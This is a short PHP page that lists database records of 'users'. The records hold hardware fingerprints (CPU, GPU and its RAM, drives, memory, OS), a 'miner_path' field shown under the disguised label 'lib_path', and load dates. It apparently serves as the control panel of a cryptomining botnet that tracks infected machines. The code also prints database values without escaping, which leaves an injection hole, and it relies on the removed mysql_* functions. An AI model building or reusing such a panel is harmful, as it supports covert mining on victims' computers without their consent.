<!DOCTYPE HTML>

<html>

<head>
  <title>users</title>





  <style>
  body{

  }

  .hd, .hdsizes, .vc{
      margin: 5px;
      border: #C9C9C9 1px solid;

  }
  .line{
      line-height: 20px;
  }
  .name{
      font-weight: bold;
      text-transform: uppercase;
  }
  .loaded{
      /*border: #6B6B6B 2px solid;
      background-color: #DBDBDB;*/
      color: #004C99;
  }

  </style>
  <meta charset="utf-8">
</head>

<body>
<?php
include_once("db.php");

$result = mysql_query("SELECT * FROM users ORDER BY id DESC");
$total_results = mysql_num_rows($result);

$output = "";
$output .= "<h1>Users</h1>";
$output .= "<p>Total ".$total_results." users</p>";


while($row = mysql_fetch_assoc($result))
{
    $loaded = false;

    if(is_dir ("files/".$row['unique_hard_id'])){$loaded = true;}

    //$output .= $row['id']."<br />";
    if($loaded){$output .= "<div class='loaded'>";}
    $output .= "<span class='name'>unique_hard_id: </span><span class='line'>".$row['unique_hard_id']."</span><br />";
    $output .= "<span class='name'>processor_name: </span><span class='line'>".$row['processor_name']."</span><br />";
    $output .= "<span class='name'>processor_manufacturer: </span><span class='line'>".$row['processor_manufacturer']."</span><br />";
    //$output .= "<span class='name'>video_controller_name: </span><span class='line'>".$row['video_controller_name']."</span><br />";
    $output .= "<span class='name'>video_controller_name: </span><span class='hd line'>".str_replace(";;;;;", "</span><span class='vc line'>", $row['video_controller_name'])."</span><br />";
    $output .= "<span class='name'>video_controller_processor_pame: </span><span class='line'>".$row['video_controller_processor_pame']."</span><br />";
    $output .= "<span class='name'>video_controller_adapter_ram: </span><span class='line'>".$row['video_controller_adapter_ram']."</span><br />";
    $output .= "<span class='name'>hard_drives: </span><span class='hd line'>".str_replace(";;;;;", "</span><span class='hd line'>", $row['hard_drives'])."</span><br />";
    $output .= "<span class='name'>hard_drives_sizes: </span><span class='hdsizes line'>".str_replace(";;;;;", "</span><span class='hd line'>", formatBytes($row['hard_drives_sizes']))."(".$row['hard_drives_sizes'].")</span><br />";
    $output .= "<span class='name'>physical_memory: </span><span class='line'>".(($row['physical_memory'] / 1024) / 1024)." M(".$row['physical_memory'].")</span><br />";
    $output .= "<span class='name'>operating_system: </span><span class='line'>".urldecode($row['os'])."</span><br />";
    $output .= "<span class='name'>os_version: </span><span class='line'>".$row['wb']."</span><br />";
    $output .= "<span class='name'>lib_path: </span><span class='line'>".$row['miner_path']."</span><br />";
    $output .= "<span class='name'>add_date: </span><span class='line'>".$row['add_date']."</span><br />";
    $output .= "<span class='name'>load_date: </span><span class='line'>".$row['load_date']."</span><br />";
    if($loaded){$output .= "</div>";}
    $output .= "<hr />";
}



echo "<center>".$output."</center>";



mysql_close($db);

function formatBytes($size, $precision = 2)
{
    $base = log($size, 1024);
    $suffixes = array('', 'K', 'M', 'G', 'T');

    return round(pow(1024, $base - floor($base)), $precision) .' '. $suffixes[floor($base)];
}
?>
</body>

</html>
